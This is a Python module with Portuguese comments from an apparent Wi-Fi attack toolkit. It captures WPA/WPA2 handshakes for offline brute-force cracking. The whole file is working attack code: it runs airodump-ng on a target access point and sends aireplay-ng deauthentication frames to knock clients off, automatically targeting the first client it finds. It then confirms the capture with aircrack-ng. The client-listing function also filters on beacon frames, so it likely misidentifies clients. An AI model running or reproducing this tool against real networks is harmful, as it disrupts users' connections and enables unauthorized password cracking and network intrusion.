"""
Módulo de captura de handshake WPA/WPA2.

Este módulo implementa a captura de handshakes WPA/WPA2, que são necessários
para realizar ataques de força bruta offline.
"""
import os
import re
import time
import logging
import subprocess
import tempfile
from typing import Optional, Dict, List, Tuple, Any, Callable
from dataclasses import dataclass, field
from enum import Enum, auto

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn

from ...core.models.network import WiFiNetwork, WiFiClient
from ...core.utils import (
    is_root, check_dependencies, get_network_interfaces,
    set_monitor_mode, restore_network_interface, command_exists,
    get_interface_mac
)

# Configuração de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
console = Console()

class HandshakeEventType(Enum):
    """Tipos de eventos da captura de handshake."""
    START = auto()
    HANDSHAKE_CAPTURED = auto()
    DEAUTH_SENT = auto()
    ERROR = auto()
    PROGRESS = auto()
    COMPLETE = auto()
    CLIENT_FOUND = auto()
    WAITING_FOR_HANDSHAKE = auto()

@dataclass
class HandshakeEvent:
    """Evento de progresso da captura de handshake."""
    type: HandshakeEventType
    message: str = ""
    data: Dict[str, Any] = field(default_factory=dict)

class HandshakeCapture:
    """Classe para capturar handshakes WPA/WPA2."""
    
    def __init__(self, interface: str = None, timeout: int = 300):
        """
        Inicializa a captura de handshake.
        
        Args:
            interface: Interface de rede para usar
            timeout: Tempo máximo de captura em segundos
        """
        self.interface = interface
        self.timeout = timeout
        self.is_running = False
        self.stop_requested = False
        self.handshake_captured = False
        self.handshake_file = ""
        self.clients = []
        
        # Verifica dependências
        self._check_dependencies()
        
        # Verifica privilégios
        if not is_root():
            raise PermissionError("Este módulo requer privilégios de root")
    
    def _check_dependencies(self) -> None:
        """Verifica se todas as dependências necessárias estão instaladas."""
        required = ['airodump-ng', 'aireplay-ng', 'aircrack-ng']
        missing = [cmd for cmd in required if not command_exists(cmd)]
        
        if missing:
            raise RuntimeError(
                f"As seguintes dependências estão faltando: {', '.join(missing)}\n"
                "Instale-as com: sudo apt install aircrack-ng"
            )
    
    def capture(self, bssid: str, channel: int, essid: str = None,
               output_prefix: str = "handshake",
               deauth: bool = True, deauth_count: int = 5,
               client_mac: str = None,
               callback: Callable[[HandshakeEvent], None] = None) -> Tuple[bool, str]:
        """
        Captura um handshake WPA/WPA2.
        
        Args:
            bssid: Endereço MAC do ponto de acesso
            channel: Canal da rede
            essid: Nome da rede (opcional)
            output_prefix: Prefixo para os arquivos de saída
            deauth: Se deve enviar pacotes de desautenticação
            deauth_count: Número de pacotes de desautenticação a enviar
            client_mac: Endereço MAC do cliente alvo (opcional)
            callback: Função de callback para eventos
            
        Returns:
            Tupla (sucesso, caminho_do_arquivo_capturado)
        """
        self.is_running = True
        self.stop_requested = False
        self.handshake_captured = False
        self.handshake_file = ""
        self.clients = []
        
        # Configura o monitoramento de eventos
        def event_handler(event_type: HandshakeEventType, message: str = "", **kwargs):
            if callback:
                event = HandshakeEvent(type=event_type, message=message, data=kwargs)
                callback(event)
        
        # Cria um diretório temporário para os arquivos
        with tempfile.TemporaryDirectory() as temp_dir:
            try:
                output_file = os.path.join(temp_dir, output_prefix)
                cap_file = f"{output_file}-01.cap"
                
                # Comando para o airodump-ng
                cmd_airodump = [
                    'airodump-ng',
                    '--bssid', bssid,
                    '-c', str(channel),
                    '-w', output_file,
                    '--output-format', 'cap,pcap',
                    '--write-interval', '1',
                    self.interface
                ]
                
                if essid:
                    cmd_airodump.extend(['--essid', essid])
                
                event_handler(HandshakeEventType.START, "Iniciando captura do handshake...")
                
                # Executa o airodump-ng em segundo plano
                airodump_proc = subprocess.Popen(
                    cmd_airodump,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    universal_newlines=True
                )
                
                # Aguarda o airodump-ng iniciar
                time.sleep(5)
                
                # Se solicitado, envia pacotes de desautenticação
                if deauth:
                    self._send_deauth(
                        bssid, 
                        count=deauth_count, 
                        client=client_mac,
                        callback=lambda e: event_handler(
                            HandshakeEventType.DEAUTH_SENT, 
                            e.message, 
                            **e.data
                        )
                    )
                
                # Monitora a captura
                start_time = time.time()
                last_client_count = 0
                
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    BarColumn(bar_width=40),
                    "[progress.percentage]{task.percentage:>3.0f}%",
                    TimeElapsedColumn(),
                    console=console,
                    transient=True,
                ) as progress:
                    task = progress.add_task("Aguardando handshake WPA...", total=100)
                    
                    while True:
                        # Verifica timeout
                        elapsed = time.time() - start_time
                        if elapsed > self.timeout:
                            event_handler(
                                HandshakeEventType.ERROR,
                                "Tempo limite excedido na captura do handshake"
                            )
                            airodump_proc.terminate()
                            return False, ""
                        
                        # Verifica se foi solicitado para parar
                        if self.stop_requested:
                            event_handler(
                                HandshakeEventType.ERROR,
                                "Captura interrompida pelo usuário"
                            )
                            airodump_proc.terminate()
                            return False, ""
                        
                        # Atualiza a barra de progresso
                        progress.update(task, completed=min(100, (elapsed / self.timeout) * 100))
                        
                        # Verifica se o arquivo de captura existe
                        if os.path.exists(cap_file):
                            # Verifica se o handshake foi capturado
                            if self._check_handshake(cap_file, bssid):
                                self.handshake_captured = True
                                self.handshake_file = cap_file
                                
                                # Copia o arquivo para o diretório atual
                                import shutil
                                final_file = os.path.join(os.getcwd(), f"{output_prefix}.cap")
                                shutil.copy2(cap_file, final_file)
                                
                                event_handler(
                                    HandshakeEventType.HANDSHAKE_CAPTURED,
                                    "Handshake capturado com sucesso!",
                                    handshake_file=final_file
                                )
                                
                                airodump_proc.terminate()
                                return True, final_file
                            
                            # Verifica por novos clientes
                            clients = self._get_clients(cap_file, bssid)
                            if len(clients) > last_client_count:
                                last_client_count = len(clients)
                                self.clients = clients
                                
                                event_handler(
                                    HandshakeEventType.CLIENT_FOUND,
                                    f"{len(clients)} cliente(s) encontrado(s)",
                                    clients=clients
                                )
                                
                                # Se não havia cliente alvo e encontrou um, envia desautenticação
                                if deauth and not client_mac and clients:
                                    client_mac = clients[0].mac
                                    self._send_deauth(
                                        bssid,
                                        client=client_mac,
                                        count=deauth_count,
                                        callback=lambda e: event_handler(
                                            HandshakeEventType.DEAUTH_SENT, 
                                            e.message, 
                                            **e.data
                                        )
                                    )
                        
                        # Aguarda um pouco antes da próxima verificação
                        time.sleep(1)
                
                return False, ""
                
            except Exception as e:
                event_handler(
                    HandshakeEventType.ERROR,
                    f"Erro durante a captura do handshake: {str(e)}"
                )
                return False, ""
            
            finally:
                self.is_running = False
                # Encerra processos em execução
                try:
                    airodump_proc.terminate()
                except:
                    pass
    
    def _send_deauth(self, bssid: str, client: str = None, 
                    count: int = 5, reason: int = 7,
                    callback: Callable[[HandshakeEvent], None] = None) -> bool:
        """
        Envia pacotes de desautenticação para forçar um handshake.
        
        Args:
            bssid: Endereço MAC do ponto de acesso
            client: Endereço MAC do cliente (None para broadcast)
            count: Número de pacotes a enviar
            reason: Código de motivo da desautenticação
            callback: Função de callback para eventos
            
        Returns:
            True se os pacotes foram enviados com sucesso, False caso contrário
        """
        try:
            cmd = [
                'aireplay-ng',
                '--deauth', str(count),
                '-a', bssid,
                '-h', get_interface_mac(self.interface) or '00:11:22:33:44:55',
                '--ignore-negative-one',
            ]
            
            if client and client.lower() != 'ff:ff:ff:ff:ff:ff':
                cmd.extend(['-c', client])
            
            cmd.append(self.interface)
            
            if callback:
                event = HandshakeEvent(
                    type=HandshakeEventType.DEAUTH_SENT,
                    message=f"Enviando {count} pacotes de desautenticação para {client or 'broadcast'}",
                    data={
                        'bssid': bssid,
                        'client': client,
                        'count': count,
                        'reason': reason
                    }
                )
                callback(event)
            
            subprocess.run(cmd, capture_output=True, check=True)
            return True
            
        except subprocess.CalledProcessError as e:
            if callback:
                event = HandshakeEvent(
                    type=HandshakeEventType.ERROR,
                    message=f"Erro ao enviar pacotes de desautenticação: {e.stderr}",
                    data={'error': str(e)}
                )
                callback(event)
            return False
    
    def _check_handshake(self, cap_file: str, bssid: str) -> bool:
        """
        Verifica se um arquivo de captura contém um handshake WPA/WPA2 válido.
        
        Args:
            cap_file: Caminho para o arquivo de captura
            bssid: Endereço MAC do ponto de acesso
            
        Returns:
            True se o handshake for válido, False caso contrário
        """
        try:
            # Usa o aircrack-ng para verificar o handshake
            cmd = ['aircrack-ng', cap_file, '-b', bssid, '-l', '/dev/null']
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            # Verifica a saída para determinar se há um handshake válido
            return "1 handshake" in result.stdout or "1 valid handshake" in result.stdout
            
        except Exception as e:
            logger.error(f"Erro ao verificar handshake: {e}")
            return False
    
    def _get_clients(self, cap_file: str, bssid: str) -> List[WiFiClient]:
        """
        Extrai a lista de clientes de um arquivo de captura.
        
        Args:
            cap_file: Caminho para o arquivo de captura
            bssid: Endereço MAC do ponto de acesso
            
        Returns:
            Lista de clientes encontrados
        """
        clients = []
        
        try:
            # Usa o tshark para extrair os endereços MAC dos clientes
            cmd = [
                'tshark',
                '-r', cap_file,
                '-Y', f'wlan.bssid == {bssid} && wlan.fc.type_subtype == 0x08',  # Beacon frames
                '-T', 'fields',
                '-e', 'wlan.ta',  # Transmitter address (client MAC)
                '-e', 'wlan_radio.signal_dbm',
                '-e', 'frame.time_relative'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            # Processa a saída
            for line in result.stdout.splitlines():
                parts = line.strip().split('\t')
                if len(parts) >= 2:
                    mac = parts[0].strip()
                    signal = int(float(parts[1])) if parts[1] else -100
                    
                    # Verifica se o cliente já está na lista
                    if not any(c.mac == mac for c in clients):
                        client = WiFiClient(
                            mac=mac,
                            signal_dbm=signal,
                            signal_percent=max(0, min(100, 2 * (signal + 100))),
                            is_associated=True
                        )
                        clients.append(client)
            
            return clients
            
        except Exception as e:
            logger.error(f"Erro ao extrair clientes: {e}")
            return []
    
    def stop(self):
        """Solicita a interrupção da captura."""
        self.stop_requested = True
